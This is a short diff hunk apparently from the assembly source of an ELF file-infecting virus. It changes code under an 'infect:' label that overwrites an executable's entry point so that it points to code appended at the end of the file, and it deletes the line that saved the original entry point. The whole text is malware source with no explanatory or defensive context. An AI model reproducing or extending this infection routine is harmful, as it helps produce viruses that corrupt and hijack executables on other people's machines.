@@ -92,7 +92,6 @@ infect:
 
 	; Modify entry point
 	lseek FD, 0, SEEK_SET
-	mov eax, dword [ELF_header + ENTRY] ; Save original entry point
 	mov eax, 0x8048000 			; ELF base address
 	add eax, esi 				; Set eax to end of file
 	mov dword [ELF_header + ENTRY], eax
